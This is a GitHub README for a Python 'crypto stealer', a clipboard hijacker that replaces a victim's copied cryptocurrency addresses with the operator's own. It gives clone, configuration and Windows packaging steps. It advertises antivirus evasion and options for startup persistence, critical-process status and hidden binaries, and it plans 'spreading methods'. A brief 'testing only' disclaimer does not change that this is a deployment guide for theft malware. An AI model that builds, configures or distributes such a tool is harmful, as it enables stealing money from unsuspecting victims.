<h3 align="center">CRYPTO STEALER</h3>

<img src=".github/using.gif"></img>

# Warning 📌
This tool is only a demonstration of how easy is to steal your cryptos. I am not responsible for the use you give to it.
Use it ONLY for testing porpuses and improving security.

## Starting 🚀

### How it works:
crypto-stealer checks the victim clipboard looking for crypto addresses. When it's found, replaces the original one with anything you want.

As a victim, it's really hard to know if my address was changed.

### Detection:
Crypto-stealer is UNDETECTED for any kind of antivirus/anti-malware.

### Requirements:
```
pyperclip==1.8.0
```

### Downloading:
```
git clone https://github.com/matifanger/crypto-stealer
cd crypto-stealer
pip3 install -r requirements.txt 
```

## Configuring ⚙️
Open (`crypto-stealer.py`).
Look for variable (`my_addresses`) and setup with anything you want.

### Useful functionalities (Only windows) (Experimental):
The variables CRITICAL_PROCCESS, ADD_TO_STARTUP, HIDE_BINARIES are explained by themselves. Turn it as you want (`False -> True`).

### Making the binaries:
When the configuration is done you should make the executable (`.exe`) to work in windows.
```
pip install auto-py-to-exe
```
then
```
auto-py-to-exe
```
In Auto Py To Exe (Mandatory)

```
One directory
Console based
```

Proper usage [here](https://pypi.org/project/auto-py-to-exe/)

## Regex cryptos - Supported 📖

- Bitcoin
- Ethereum
- Dash
- Cardano
- Polkadot
- Ripple
- Tron
- Litecoin
- Monero
- Doge

## Todo 📄

- [ ] Add more cryptos
- [ ] Add spreading methods
- [ ] Add linux support